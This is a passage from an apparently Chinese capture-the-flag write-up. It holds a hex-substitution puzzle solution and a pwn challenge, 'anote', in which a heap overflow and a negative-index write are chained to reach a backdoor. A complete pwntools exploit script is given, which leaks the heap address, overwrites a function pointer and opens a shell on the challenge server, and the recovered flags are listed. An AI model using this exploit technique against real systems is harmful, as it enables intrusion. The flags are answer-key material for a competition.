#上段中？部分不知道00的对应内容，最后在平台一个个试的最后结果是4（试出来之后不一会儿就给提示说是4了（乐））
ABCDEFGHIJKL M NOPQRS T UVWXYZ


02030405060708090a0b0c0d0e0f101112131415161718191a1b
A B C D E F G H I J K L M N O P Q R S T U V W X Y Z


1e1f202122232425262728292a2b2c2d
a b c d e f g h i j k l m n o p


23 29 1E 24 38 0E 15 20 37 0E 05 20 00 0E 37 12 1D 0F 24 01 01 39

23291e24380e1520370e0520000e3712 1d 0f 24 01 01 39
23 29 1e 24 38 0e 15 20 37 0e 05 20 00 0e 37 12 1d 0f 24 01 01 39

23 29 1e 24 38 0e 15 20 37 0e 05 20 1c 0e 37 12 1d 0f 24 01 01 39

1c1d000000000000000000000100000002030405060708090a0b0c0d0e0f

```

`flag{MTczMDc4MzQ2Ng==}`

# PWN

## anote

ida反编译不是给人看的，直接鸡爪启动，有add,show,edit三个功能，edit有堆溢出，可以读入40个字节，show会给出堆块的地址，并且有后门，edit可以输入负数，也就是说可以越界，并且有个call rax,根据偏移写入堆块地址，堆块中写入后门，getshell

![image-20241216091913531](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216091924480-1952953316.png)

![image-20241216091924255](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216091934966-125092182.png)

![image-20241216091928723](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216091939379-879390541.png)



exp:

```python
from pwn import *
context(os='linux',arch='i386',log_level='debug')

io=remote("39.105.123.22",30938)

backdoor=0x080489CE

def add():
    io.recvuntil("Choice>>")
    io.sendline(str(1))

def show():
    io.recvuntil("Choice>>")
    io.sendline(str(2))
    io.recvuntil("index:")
    io.sendline(str(0))

def edit(k,size,fenshu):
    io.recvuntil("Choice>>")
    io.sendline(str(3))
    io.recvuntil("index:")
    io.sendline(str(k))
    io.recvuntil("len:")
    io.sendline(str(size))
    io.recvuntil("content:")
    io.sendline(fenshu)

add()
add()
add()
show()
io.recvuntil(b'0x')
heap_addr=int(io.recv(7),16)
edit(0,0x28,p32(heap_addr-37000)+p32(0)*4+p32(0x21)+p32(backdoor))
edit(-8,0x28,p32(heap_addr+32))
io.interactive()
```

![image-20241216091947749](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241216091958877-230897655.png)

`flag{7c66ca9e-6fdb-4ea1-8c91-e759ae505e87}`

